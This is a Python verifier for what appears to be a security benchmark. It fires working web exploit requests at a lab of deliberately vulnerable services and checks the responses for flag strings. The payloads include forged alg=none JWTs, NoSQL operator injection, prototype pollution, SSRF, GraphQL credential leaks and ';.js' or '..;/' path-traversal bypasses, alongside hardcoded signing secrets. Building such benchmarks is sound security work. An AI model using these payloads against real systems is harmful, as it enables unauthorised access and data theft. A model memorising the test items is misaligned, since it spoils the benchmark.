"""Vulnerability verifier — direct HTTP tests against the benchmark target range.

Each test case sends a real HTTP request to trigger a specific vulnerability,
then checks the response for the expected flag strings defined in the source code.
"""
from __future__ import annotations

import base64
import hashlib as _hashlib
import hmac as _hmac
import json
import os
import pickle
import random
import re
import socket
import ssl
import time as _time
import urllib.error
import urllib.parse
import urllib.request
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any


# ============================================================
# Request signing helpers for verifier
# ============================================================

# HMAC-SHA256 signing for Node.js (www.target.bench) system
_HMAC_APP_KEY = 'ak_www_pub_2024'
_HMAC_APP_SECRET = 'sk_www_sign_hmac_2024'

def _parse_qs_brackets(qs: str) -> dict:
    """Parse query string with bracket notation, matching Express qs parser behavior.

    Express's qs parser converts ``username[$ne]=x`` into ``{"username": {"$ne": "x"}}``.
    This function replicates that nesting so the HMAC signature matches the server-side
    computation.

    Only single-level bracket nesting is supported (sufficient for the benchmark's
    NoSQL injection test cases).
    """
    result: dict = {}
    for part in qs.split('&'):
        if not part:
            continue
        if '=' in part:
            raw_key, v = part.split('=', 1)
        else:
            raw_key, v = part, ''
        k = urllib.parse.unquote(raw_key)
        v = urllib.parse.unquote(v)
        # Check for bracket notation: key[inner]
        bracket_match = re.match(r'^([^\[]+)\[([^\]]+)\]$', k)
        if bracket_match:
            outer_key = bracket_match.group(1)
            inner_key = bracket_match.group(2)
            if outer_key not in result or not isinstance(result[outer_key], dict):
                result[outer_key] = {}
            result[outer_key][inner_key] = v
        else:
            result[k] = v
    return result


def _sign_hmac_request(method: str, path: str, query_params: dict | None = None,
                       body: dict | None = None) -> dict:
    """Generate HMAC-SHA256 signature headers for Node.js system requests."""
    timestamp = str(int(_time.time() * 1000))
    params = {}
    if method.upper() in ('GET', 'DELETE'):
        if query_params:
            params.update(query_params)
    else:
        if body:
            params.update(body)
    params['timestamp'] = timestamp
    params['app_key'] = _HMAC_APP_KEY
    # Remove null/undefined
    clean = {k: v for k, v in params.items() if v is not None}
    sorted_keys = sorted(clean.keys())
    sign_str = '&'.join(f'{k}={json.dumps(clean[k], separators=(",", ":")) if isinstance(clean[k], (dict, list)) else clean[k]}'
                        for k in sorted_keys)
    sign = _hmac.new(_HMAC_APP_SECRET.encode(), sign_str.encode(), _hashlib.sha256).hexdigest()
    return {'X-Sign': sign, 'X-Timestamp': timestamp, 'X-App-Key': _HMAC_APP_KEY}


# RSA-SHA256 signing for Flask (admin.target.bench / shop.target.bench) system
_RSA_APP_ID = 'app_admin_panel_2024'
_RSA_PRIVATE_KEY_PATH = os.path.join(os.path.dirname(__file__), '..', '..', 'targets', 'keys', 'rsa_private.pem')

def _load_rsa_private_key():
    """Load RSA private key from PEM file."""
    key_path = os.path.normpath(_RSA_PRIVATE_KEY_PATH)
    if not os.path.exists(key_path):
        return None
    from cryptography.hazmat.primitives import serialization
    with open(key_path, 'rb') as f:
        return serialization.load_pem_private_key(f.read(), password=None)

_RSA_PRIVATE_KEY = None  # Lazy loaded

def _sign_rsa_request(method: str, path: str, body: bytes | None = None) -> dict:
    """Generate RSA-SHA256 signature headers for Flask system requests."""
    global _RSA_PRIVATE_KEY
    if _RSA_PRIVATE_KEY is None:
        _RSA_PRIVATE_KEY = _load_rsa_private_key()
    if _RSA_PRIVATE_KEY is None:
        return {}  # No key available, skip signing

    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding

    timestamp = str(int(_time.time() * 1000))
    body_hash = _hashlib.sha256(body or b'').hexdigest()
    sign_str = f"{method.upper()}\n{path}\n{timestamp}\n{body_hash}"
    signature = _RSA_PRIVATE_KEY.sign(
        sign_str.encode(),
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    signature_b64 = base64.b64encode(signature).decode()
    return {'X-Signature': signature_b64, 'X-Timestamp': timestamp, 'X-App-Id': _RSA_APP_ID}


# ═══════════════════════════════════════════════════════════════════════
# Data models
# ═══════════════════════════════════════════════════════════════════════


@dataclass
class VulnTestCase:
    """A single vulnerability test case."""
    id: str
    name: str
    scenario_id: str
    scenario_name: str
    method: str
    path: str
    host: str  # Host header
    headers: dict = field(default_factory=dict)
    body: str | None = None
    content_type: str | None = None
    expected_flags: list[str] = field(default_factory=list)
    expected_status: int | None = None
    severity: str = "medium"
    setup_id: str | None = None  # ID of a setup test that must pass first
    follow_redirects: bool = True  # Whether to follow HTTP redirects
    alternate_url: str | None = None  # Override base_url for Host collision tests on priv-gateway


@dataclass
class VulnTestResult:
    """Result of a single vulnerability test."""
    test_id: str
    name: str
    scenario_id: str
    scenario_name: str
    verified: bool
    status_code: int | None
    response_snippet: str  # first 500 chars
    error: str | None
    matched_flags: list[str]
    missing_flags: list[str]
    severity: str


@dataclass
class VulnReport:
    """Full vulnerability verification report."""
    total: int
    verified: int
    failed: int
    skipped: int
    scenarios: dict  # scenario_id -> {total, verified, failed, skipped}
    results: list[VulnTestResult]

    def to_dict(self) -> dict:
        return {
            "total": self.total,
            "verified": self.verified,
            "failed": self.failed,
            "skipped": self.skipped,
            "verification_rate": round(self.verified / self.total, 4) if self.total > 0 else 0.0,
            "scenarios": self.scenarios,
            "results": [
                {
                    "test_id": r.test_id,
                    "name": r.name,
                    "scenario_id": r.scenario_id,
                    "scenario_name": r.scenario_name,
                    "verified": r.verified,
                    "status_code": r.status_code,
                    "response_snippet": r.response_snippet,
                    "error": r.error,
                    "matched_flags": r.matched_flags,
                    "missing_flags": r.missing_flags,
                    "severity": r.severity,
                }
                for r in self.results
            ],
        }


# ═══════════════════════════════════════════════════════════════════════
# HTTP helpers
# ═══════════════════════════════════════════════════════════════════════


def _auto_sign_request(method: str, url: str, headers: dict, body: bytes | None, req: urllib.request.Request) -> dict:
    """Auto-sign request based on target system. Returns updated headers dict.

    Adds HMAC-SHA256 signature for www.target.bench (Node.js) requests,
    and RSA-SHA256 signature for admin.target.bench / shop.target.bench (Flask) requests.
    """
    # Only sign if not already signed
    if 'X-Sign' in headers or 'X-Signature' in headers:
        return headers

    # Determine URL path (strip scheme and host — only strip the leading scheme, not
    # embedded ones in query parameter values like url=http://...)
    from urllib.parse import urlparse
    parsed_url = urlparse(url)
    url_path = parsed_url.path or '/'
    # Re-attach query string for parameter extraction (but not for RSA signing)
    if parsed_url.query:
        url_path_full = url_path + '?' + parsed_url.query
    else:
        url_path_full = url_path

    host_header = headers.get('Host', '')
    if 'www.target.bench' in url or 'www.target.bench' in host_header:
        # Extract query params from URL for GET/DELETE, parse body for POST/PUT/DELETE
        query_params = None
        body_params = None
        if method.upper() in ('GET', 'DELETE'):
            qs = parsed_url.query
            if qs:
                query_params = _parse_qs_brackets(qs)
        else:
            if body:
                try:
                    body_params = json.loads(body.decode('utf-8', errors='replace'))
                except (json.JSONDecodeError, AttributeError):
                    body_params = None
        sign_headers = _sign_hmac_request(method, url_path, query_params=query_params, body=body_params)
        headers.update(sign_headers)
        for k, v in sign_headers.items():
            req.add_header(k, v)
    elif 'admin.target.bench' in url or 'shop.target.bench' in url or \
         'admin.target.bench' in host_header or 'shop.target.bench' in host_header:
        sign_headers = _sign_rsa_request(method, url_path, body)
        headers.update(sign_headers)
        for k, v in sign_headers.items():
            req.add_header(k, v)

    return headers


def _http_request(
    method: str,
    url: str,
    headers: dict | None = None,
    body: bytes | None = None,
    timeout: int = 10,
    follow_redirects: bool = False,
) -> tuple[int, str, dict]:
    """Send HTTP request and return (status_code, response_body, response_headers)."""
    if headers is None:
        headers = {}
    req = urllib.request.Request(url, data=body, method=method)
    for k, v in headers.items():
        req.add_header(k, v)

    # Auto-sign request based on target system
    headers = _auto_sign_request(method, url, headers, body, req)

    if follow_redirects:
        # urllib follows redirects by default; we need to disable for open_redirect test
        pass

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        raw_body = resp.read().decode("utf-8", errors="replace")
        resp_headers = dict(resp.headers)
        return resp.status, raw_body, resp_headers
    except urllib.error.HTTPError as e:
        raw_body = e.read().decode("utf-8", errors="replace")
        resp_headers = dict(e.headers)
        return e.code, raw_body, resp_headers
    except Exception as e:
        return 0, "", {"_error": str(e)}


def _http_request_no_redirect(
    method: str,
    url: str,
    headers: dict | None = None,
    body: bytes | None = None,
    timeout: int = 10,
) -> tuple[int, str, dict]:
    """Send HTTP request WITHOUT following redirects."""
    if headers is None:
        headers = {}
    req = urllib.request.Request(url, data=body, method=method)
    for k, v in headers.items():
        req.add_header(k, v)

    # Auto-sign request based on target system
    headers = _auto_sign_request(method, url, headers, body, req)

    try:
        # Build a custom opener that doesn't follow redirects
        class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                return None

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = urllib.request.build_opener(NoRedirectHandler, urllib.request.HTTPSHandler(context=ctx))
        resp = opener.open(req, timeout=timeout)
        raw_body = resp.read().decode("utf-8", errors="replace")
        resp_headers = dict(resp.headers)
        return resp.status, raw_body, resp_headers
    except urllib.error.HTTPError as e:
        raw_body = e.read().decode("utf-8", errors="replace")
        resp_headers = dict(e.headers)
        return e.code, raw_body, resp_headers
    except Exception as e:
        return 0, "", {"_error": str(e)}


def _tcp_check(host: str, port: int, timeout: int = 3) -> bool:
    """Check if a TCP port is open."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.close()
        return True
    except Exception:
        return False


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _make_jwt(header: dict, payload: dict) -> str:
    """Create a JWT token string (unsigned)."""
    h = _b64url_encode(json.dumps(header).encode())
    p = _b64url_encode(json.dumps(payload).encode())
    return f"{h}.{p}."


# ═══════════════════════════════════════════════════════════════════════
# Test case definitions — all test cases derived from source code analysis
# ═══════════════════════════════════════════════════════════════════════


def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTestCase]:
    """Build all vulnerability test cases.

    Sources:
      - targets/services/modern-app/app.js  (www.target.bench)
      - targets/services/admin-panel/app.py  (admin.target.bench)
      - targets/services/bff-gateway/app.py  (shop.target.bench)
      - targets/services/internal-tools/app.py  (internal.target.bench)
      - targets/gateway/nginx.conf  (multi-entry routing)
      - targets/docker-compose.yml  (infrastructure services)
    """
    cases: list[VulnTestCase] = []

    # ═══════════════════════════════════════════════════════════════
    # S4: modern_vulns — modern-app (www.target.bench)
    # ═══════════════════════════════════════════════════════════════

    # M9: CORS wildcard — check response header
    cases.append(VulnTestCase(
        id="M9", name="CORS wildcard misconfiguration",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/", host="www.target.bench",
        expected_flags=["Access-Control-Allow-Origin"],
        severity="high",
    ))

    # M1: JWT alg=none — bypass authentication
    jwt_none_token = _make_jwt(
        {"alg": "none", "typ": "JWT"},
        {"userId": "000000000000000000000001", "role": "admin"},
    )
    cases.append(VulnTestCase(
        id="M1", name="JWT alg=none bypass",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users", host="www.target.bench",
        headers={"Authorization": f"Bearer {jwt_none_token}"},
        expected_flags=["username"],  # should return user list, not 401
        severity="high",
    ))

    # M2: JWT weak secret — verify via error message with proper JWT format
    # Use a properly formatted JWT with an invalid signature to test auth endpoint
    jwt_bad_token = _make_jwt(
        {"alg": "HS256", "typ": "JWT"},
        {"userId": "test", "role": "admin"},
    ) + "invalid_signature"
    cases.append(VulnTestCase(
        id="M2", name="JWT weak secret",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users/anyid", host="www.target.bench",
        headers={"Authorization": f"Bearer {jwt_bad_token}"},
        expected_flags=["Invalid token", "detail"],
        severity="high",
    ))

    # M4: NoSQLi $ne operator
    cases.append(VulnTestCase(
        id="M4", name="NoSQLi $ne operator",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users?username[$ne]=nonexistent&debug=1",
        host="www.target.bench",
        expected_flags=["NOSQL_INJECTION_DEBUG"],
        severity="high",
    ))

    # M5: NoSQLi $gt operator
    cases.append(VulnTestCase(
        id="M5", name="NoSQLi $gt operator",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users?role[$gt]=&debug=1",
        host="www.target.bench",
        expected_flags=["NOSQL_INJECTION_DEBUG"],
        severity="high",
    ))

    # M6: Prototype pollution via constructor.prototype in Object.assign
    cases.append(VulnTestCase(
        id="M6", name="Prototype pollution via constructor.prototype",
        scenario_id="S4", scenario_name="modern_vulns",
        method="PUT", path="/api/users/000000000000000000000001", host="www.target.bench",
        headers={
            "Authorization": f"Bearer {jwt_none_token}",
            "Content-Type": "application/json",
        },
        body=json.dumps({"constructor": {"prototype": {"isAdmin": True}}}),
        expected_flags=["PROTOTYPE_POLLUTION_SUCCESS"],
        severity="high",
    ))

    # M7: Mass assignment — register with role=admin
    rand_user = f"test_{random.randint(10000, 99999)}"
    cases.append(VulnTestCase(
        id="M7", name="Mass assignment via registration",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/api/auth/register", host="www.target.bench",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"username": rand_user, "password": "test123", "email": f"{rand_user}@test.com", "role": "admin"}),
        expected_flags=["MASS_ASSIGNMENT_ADMIN"],
        severity="high",
    ))

    # M8: Excessive data exposure — we need a real user ID from M4 response
    # Use a known valid ObjectId format. The MongoDB seed creates users with specific IDs.
    # Since we can't know the exact ID at runtime, we verify via the /api/users?debug=1 endpoint
    # which returns password fields when debug=1 is set
    cases.append(VulnTestCase(
        id="M8", name="Excessive data exposure",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users?debug=1", host="www.target.bench",
        headers={"Authorization": f"Bearer {jwt_none_token}"},
        expected_flags=["password"],  # debug mode exposes password field
        severity="high",
    ))

    # M10: SSRF via /api/fetch
    cases.append(VulnTestCase(
        id="M10", name="SSRF via fetch endpoint",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/fetch?url=http://172.20.0.11:5000/api/internal/health",
        host="www.target.bench",
        expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
        severity="high",
    ))

    # M11: Integer overflow / price manipulation
    cases.append(VulnTestCase(
        id="M11", name="Integer overflow / price manipulation",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/api/orders", host="www.target.bench",
        headers={
            "Authorization": f"Bearer {jwt_none_token}",
            "Content-Type": "application/json",
        },
        body=json.dumps({"productId": "MacBook", "quantity": 1, "price": -99999}),
        expected_flags=["total", "-99999"],  # total should be negative
        severity="high",
    ))

    # M12: Open redirect — don't follow redirects to verify 302
    cases.append(VulnTestCase(
        id="M12", name="Open redirect",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/redirect?url=https://evil.com", host="www.target.bench",
        expected_flags=[],  # verify via redirect status
        expected_status=302,
        follow_redirects=False,
        severity="medium",
    ))

    # M13: GraphQL introspection
    introspection_query = '{"query":"{__schema{types{name}}}"}'
    cases.append(VulnTestCase(
        id="M13", name="GraphQL introspection enabled",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/graphql", host="www.target.bench",
        headers={"Content-Type": "application/json"},
        body=introspection_query,
        expected_flags=["__schema"],
        severity="medium",
    ))

    # M14: GraphQL updateUser mutation — mass assignment via input JSON
    # Note: hardcoded ObjectId may not exist, but mutation endpoint is accessible
    cases.append(VulnTestCase(
        id="M14", name="GraphQL updateUser mutation accessible",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/graphql", host="www.target.bench",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"query": "mutation { updateUser(id: \"000000000000000000000001\", input: \"{\\\"role\\\":\\\"admin\\\"}\") { username } }"}),
        expected_flags=["data"],
        severity="high",
    ))

    # M15: GraphQL users query leaks password
    cases.append(VulnTestCase(
        id="M15", name="GraphQL users query leaks password",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/graphql", host="www.target.bench",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"query": "{ users { username password } }"}),
        expected_flags=["password", "admin123"],
        severity="high",
    ))

    # M17: DEBUG error handler leaks stack trace + env
    # Trigger via /api/users/:id with invalid ObjectId (fixed to catch+log)
    cases.append(VulnTestCase(
        id="M17", name="DEBUG error handler leaks stack trace",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users/not_a_valid_hex_id", host="www.target.bench",
        headers={"Authorization": f"Bearer {jwt_none_token}"},
        expected_flags=["error", "stack"],  # try/catch leaks stack in DEBUG mode
        severity="high",
    ))


    # ═══════════════════════════════════════════════════════════════
    # S3: hidden_param_detection (精简 21→7)
    # ═══════════════════════════════════════════════════════════════

    # HP_DEBUG_PARAM: debug=1 on login (POST)
    cases.append(VulnTestCase(
        id="HP_DEBUG_PARAM", name="Hidden param debug=1 on login",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="POST", path="/login?debug=1", host="admin.target.bench",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body="username=admin&password=wrong",
        expected_flags=["sql_query", "jwt_secret_preview"],
        severity="high",
    ))

    # HP_INTERNAL_PARAM: internal=true on /api/users
    cases.append(VulnTestCase(
        id="HP_INTERNAL_PARAM", name="Hidden param internal=true",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users?internal=true", host="admin.target.bench",
        expected_flags=["HIDDEN_PARAM_INTERNAL_TRUE"],
        severity="high",
    ))

    # HP_SENSITIVE_PARAM: sandbox=1 on /api/system/status
    cases.append(VulnTestCase(
        id="HP_SENSITIVE_PARAM", name="Hidden param sensitive (sandbox=1)",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/system/status?sandbox=1", host="admin.target.bench",
        expected_flags=["HIDDEN_PARAM_SANDBOX_BYPASS"],
        severity="high",
    ))

    # V10: Pickle deserialization
    pickle_payload = base64.b64encode(pickle.dumps({"test": "data"})).decode()
    cases.append(VulnTestCase(
        id="V10_PICKLE", name="Pickle deserialization RCE",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="POST", path="/api/preferences", host="admin.target.bench",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"__pickle_data": pickle_payload}),
        expected_flags=["HIDDEN_PARAM_PICKLE_RCE"],
        severity="high",
    ))

    # V11: XXE via XML parser
    cases.append(VulnTestCase(
        id="V11_XXE", name="XXE via XML bulk-delete",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="POST", path="/api/users/bulk-delete", host="admin.target.bench",
        headers={"Content-Type": "application/xml"},
        body='<?xml version="1.0"?><users><id>1</id></users>',
        expected_flags=["HIDDEN_PARAM_XXE_TRIGGERED"],
        severity="high",
    ))

    # V12: Header backdoor
    cases.append(VulnTestCase(
        id="V12_HEADER", name="Header backdoor X-Internal-Request",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/internal/config", host="admin.target.bench",
        headers={"X-Internal-Request": "true"},
        expected_flags=["jwt", "database", "admin_token"],
        severity="high",
    ))

    # V15_500LEAK: 500 error leak — verify debug mode is enabled
    cases.append(VulnTestCase(
        id="V15_500LEAK", name="DEBUG mode leaks error details",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="POST", path="/api/preferences", host="admin.target.bench",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"__pickle_data": "invalid_base64!!!"}),
        expected_flags=["error"],
        severity="high",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S2: multi_entry_bypass (精简 6→3)
    # ═══════════════════════════════════════════════════════════════

    # ME_API_BYPASS: api.target.bench bypass
    cases.append(VulnTestCase(
        id="ME_API_BYPASS", name="api.target.bench bypass to admin internal endpoints",
        scenario_id="S2", scenario_name="multi_entry_bypass",
        method="GET", path="/api/internal/health", host="api.target.bench",
        expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
        severity="critical",
    ))

    # ME_SHOP_BYPASS: shop.target.bench bypass
    cases.append(VulnTestCase(
        id="ME_SHOP_BYPASS", name="shop.target.bench /sysadmin/ bypass to admin-panel",
        scenario_id="S2", scenario_name="multi_entry_bypass",
        method="GET", path="/sysadmin/users", host="shop.target.bench",
        expected_flags=["username", "role"],
        severity="critical",
    ))

    # ME_MULTI_HOST_COVERAGE: multi-host coverage
    cases.append(VulnTestCase(
        id="ME_MULTI_HOST_COVERAGE", name="shop.target.bench /debug/admin bypass",
        scenario_id="S2", scenario_name="multi_entry_bypass",
        method="GET", path="/debug/admin", host="shop.target.bench",
        expected_flags=["status", "version"],
        severity="high",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S6: bff_vulns (精简 4→3)
    # ═══════════════════════════════════════════════════════════════

    # B1: User profile leaks PII via BFF aggregation
    cases.append(VulnTestCase(
        id="B1", name="BFF user profile exposes admin data",
        scenario_id="S6", scenario_name="bff_vulns",
        method="GET", path="/api/shop/user-profile", host="shop.target.bench",
        expected_flags=["BFF_aggregated", "username"],
        severity="critical",
    ))

    # B2: /sysadmin/ proxy without auth
    cases.append(VulnTestCase(
        id="B2", name="BFF sysadmin proxy without auth",
        scenario_id="S6", scenario_name="bff_vulns",
        method="GET", path="/sysadmin/system/status", host="shop.target.bench",
        expected_flags=["status", "version"],
        severity="critical",
    ))

    # B6_COVERAGE: BFF proxy coverage (合并 B3+BFF_INTERNAL)
    cases.append(VulnTestCase(
        id="B6_COVERAGE", name="BFF debug/admin exposes admin-panel debug",
        scenario_id="S6", scenario_name="bff_vulns",
        method="GET", path="/debug/admin", host="shop.target.bench",
        expected_flags=["status", "version"],
        severity="high",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S5: info_leak — internal-tools (internal.target.bench)
    # ═══════════════════════════════════════════════════════════════

    cases.append(VulnTestCase(
        id="I1", name="Backup schedule info leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/backup", host="internal.target.bench",
        expected_flags=["INFO_BACKUP_LEAK", "mysql://"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I2", name="Environment variables leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/env", host="internal.target.bench",
        expected_flags=["DB_HOST", "REDIS_HOST"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I3", name="Config info leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/config", host="internal.target.bench",
        expected_flags=["INFO_CONFIG_LEAK", "apppass123"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I4", name="Network topology leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/network", host="internal.target.bench",
        expected_flags=["INFO_NETWORK_LEAK", "172.20.0.10"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I5", name="Source code leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/source", host="internal.target.bench",
        expected_flags=["INFO_SOURCE_CODE_LEAK", "JWT_SECRET"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I6", name="Database backup download",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/backup/latest.sql", host="internal.target.bench",
        expected_flags=["INFO_BACKUP_DOWNLOAD", "admin123"],
        severity="high",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S1: subdomain_discovery
    # ═══════════════════════════════════════════════════════════════

    # SUB_SHOP stays on pub-gateway (BFF is reachable via pub-gateway)
    cases.append(VulnTestCase(
        id="SUB_SHOP", name="Subdomain shop.target.bench reachable",
        scenario_id="S1", scenario_name="subdomain_discovery",
        method="GET", path="/", host="shop.target.bench",
        expected_flags=["BFF"],
        severity="medium",
    ))

    # SUB_ADMIN — admin resolves to priv-gateway IP (Host collision)
    cases.append(VulnTestCase(
        id="SUB_ADMIN", name="Subdomain admin.target.bench reachable (Host collision)",
        scenario_id="S1", scenario_name="subdomain_discovery",
        method="GET", path="/", host="admin.target.bench",
        expected_flags=["admin"],
        severity="medium",
        alternate_url=priv_url,
    ))

    # SUB_API — api resolves to priv-gateway IP (Host collision)
    cases.append(VulnTestCase(
        id="SUB_API", name="Subdomain api.target.bench reachable (Host collision)",
        scenario_id="S1", scenario_name="subdomain_discovery",
        method="GET", path="/", host="api.target.bench",
        expected_flags=["Modern API"],
        severity="medium",
        alternate_url=priv_url,
    ))

    # SUB_INTERNAL — internal resolves to priv-gateway IP (Host collision)
    cases.append(VulnTestCase(
        id="SUB_INTERNAL", name="Subdomain internal.target.bench reachable (Host collision)",
        scenario_id="S1", scenario_name="subdomain_discovery",
        method="GET", path="/", host="internal.target.bench",
        expected_flags=["endpoints"],
        severity="medium",
        alternate_url=priv_url,
    ))

    # SUB_WWW — www.target.bench 根路径 redirect 到 /shop（nginx return 302）
    cases.append(VulnTestCase(
        id="SUB_WWW", name="Subdomain www.target.bench reachable (redirects to /shop)",
        scenario_id="S1", scenario_name="subdomain_discovery",
        method="GET", path="/", host="www.target.bench",
        expected_flags=["/shop"],  # redirect Location 包含 /shop
        expected_status=302,
        follow_redirects=False,
        severity="medium",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S7: infrastructure — TCP port checks on localhost mapped ports
    # Docker maps: 13306:3306, 6379:6379, 27017:27017

    cases.append(VulnTestCase(
        id="N1", name="MySQL service exposed",
        scenario_id="S7", scenario_name="infrastructure",
        method="TCP", path="localhost:13306", host="",
        expected_flags=["TCP_OPEN"],
        severity="medium",
    ))

    cases.append(VulnTestCase(
        id="N2", name="Redis service exposed",
        scenario_id="S7", scenario_name="infrastructure",
        method="TCP", path="localhost:6379", host="",
        expected_flags=["TCP_OPEN"],
        severity="medium",
    ))

    cases.append(VulnTestCase(
        id="N3", name="MongoDB service exposed",
        scenario_id="S7", scenario_name="infrastructure",
        method="TCP", path="localhost:27017", host="",
        expected_flags=["TCP_OPEN"],
        severity="medium",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S17: microservice_path_normalization_bypass (精简 14→4)
    # ═══════════════════════════════════════════════════════════════

    # PN_TRAVERSAL_BYPASS: ..;/..;/ traversal to actuator/env (代表点)
    cases.append(VulnTestCase(
        id="PN_TRAVERSAL_BYPASS", name="..;/..;/ traversal bypass to actuator/env",
        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
        method="GET", path="/api/users/..;/..;/actuator/env", host="api.target.bench",
        expected_flags=["user_service_app", "Us3rS3rv1ce", "JWT_SECRET"],
        expected_status=200, severity="critical",
    ))

    # PN_TRAVERSAL_COVERAGE: traversal hits ≥2 services (order-service 代表)
    cases.append(VulnTestCase(
        id="PN_TRAVERSAL_COVERAGE", name="..;/..;/ traversal to order-service actuator/env",
        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
        method="GET", path="/api/orders/..;/..;/actuator/env", host="api.target.bench",
        expected_flags=["order_service_app", "0rd3rS3rv1ce", "MQ_URL"],
        expected_status=200, severity="high",
    ))

    # PN_DIRECT_BLOCKED: direct /actuator blocked by gateway
    cases.append(VulnTestCase(
        id="PN_DIRECT_BLOCKED", name="Direct /actuator/env blocked by gateway",
        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
        method="GET", path="/actuator/env", host="api.target.bench",
        expected_status=403, severity="medium",
    ))

    # PN_URL_ENCODED_BLOCKED: URL-encoded traversal also blocked
    cases.append(VulnTestCase(
        id="PN_URL_ENCODED_BLOCKED", name="URL-encoded ..%2f..%2f blocked by nginx",
        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
        method="GET", path="/api/users/..%2f..%2f/actuator/env", host="api.target.bench",
        expected_status=403, severity="medium",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S18: admin_whitelist_suffix_bypass (精简 12→4)
    # ═══════════════════════════════════════════════════════════════

    # WB_SUFFIX_BYPASS: ;.js bypass (代表点 — user-service)
    cases.append(VulnTestCase(
        id="WB_SUFFIX_BYPASS", name=";.js bypass to user-service admin/dashboard",
        scenario_id="S18", scenario_name="admin_whitelist_suffix_bypass",
        method="GET", path="/api/users/admin/dashboard;.js", host="api.target.bench",
        expected_flags=["ADMIN_WHITELIST_BYPASS_USER", "allUsers", "jwtSecret"],
        expected_status=200, severity="critical",
    ))

    # WB_SUFFIX_COVERAGE: ;.js bypass on order-service (覆盖面代表)
    cases.append(VulnTestCase(
        id="WB_SUFFIX_COVERAGE", name=";.js bypass to order-service admin/dashboard",
        scenario_id="S18", scenario_name="admin_whitelist_suffix_bypass",
        method="GET", path="/api/orders/admin/dashboard;.js", host="api.target.bench",
        expected_flags=["ADMIN_WHITELIST_BYPASS_ORDER", "mqPassword"],
        expected_status=200, severity="high",
    ))

    # WB_SUFFIX_VARIANT: ;.html variant bypass
    cases.append(VulnTestCase(
        id="WB_SUFFIX_VARIANT", name=";.html bypass to user-service admin/dashboard",
        scenario_id="S18", scenario_name="admin_whitelist_suffix_bypass",
        method="GET", path="/api/users/admin/dashboard;.html", host="api.target.bench",
        expected_flags=["ADMIN_WHITELIST_BYPASS_USER"],
        expected_status=200, severity="high",
    ))

    # WB_DIRECT_BLOCKED: direct access blocked
    cases.append(VulnTestCase(
        id="WB_DIRECT_BLOCKED", name="Direct /api/users/admin/dashboard blocked by filter",
        scenario_id="S18", scenario_name="admin_whitelist_suffix_bypass",
        method="GET", path="/api/users/admin/dashboard", host="api.target.bench",
        expected_status=403, severity="medium",
    ))

    # v5.0: Auto-route priv-gateway subdomains (admin/api/internal) to priv_url
    # Pub-gateway returns 444 for these Host headers; must use priv-gateway instead
    PRIV_GATEWAY_HOSTS = {"admin.target.bench", "api.target.bench", "internal.target.bench"}
    for c in cases:
        if c.host in PRIV_GATEWAY_HOSTS and c.alternate_url is None and priv_url:
            c.alternate_url = priv_url

    return cases


# ═══════════════════════════════════════════════════════════════════════
